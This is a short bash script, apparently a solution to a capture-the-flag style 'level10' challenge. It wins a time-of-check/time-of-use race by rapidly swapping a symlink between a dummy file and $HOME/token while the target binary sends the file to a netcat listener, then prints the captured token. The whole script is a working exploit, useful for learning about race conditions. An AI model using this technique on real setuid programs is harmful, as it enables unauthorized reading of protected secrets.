#!/bin/bash
touch /tmp/temp
(nc -lk 6969 >> /tmp/token10)&
pid1=$!
(while true; do $HOME/level10 /tmp/temp2 127.0.0.1 &>/dev/null; done)&
pid2=$!
(while true; do ln -sf /tmp/temp /tmp/temp2; ln -sf $HOME/token /tmp/temp2; done)&
pid3=$!
sleep 1
cat /tmp/token10
echo ""
echo "/\\ Enjoy ! found the token somewhere between banners /\\"
kill $pid1&
kill $pid2&
kill $pid3&
